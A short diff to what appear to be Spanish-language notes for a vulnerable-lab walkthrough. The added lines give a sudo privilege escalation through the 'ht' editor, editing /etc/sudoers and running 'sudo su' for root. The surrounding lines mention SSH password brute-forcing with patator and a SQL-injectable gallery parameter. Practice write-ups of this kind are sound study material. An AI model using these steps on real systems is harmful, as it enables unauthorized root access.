@@ -85,6 +85,11 @@ patator ssh_login host=192.168.111.131 user=loneferret password=FILE0 0=/home/ka
 ssh loneferret@192.168.111.131
 export TERM=xterm
 sudo /usr/local/bin/ht
+F3 y abrimos /etc/sudoers
+Añadimos loneferret ALL=(ALL:ALL) ALL
+Guardamos y salimos
+sudo su
+Y somos root
 
 Cambiamos a 192.168.111.132 la IP por reseteo de la máquina
 GET /gallery/gallery.php?id=* # ID Vulnerable a SQL Injection
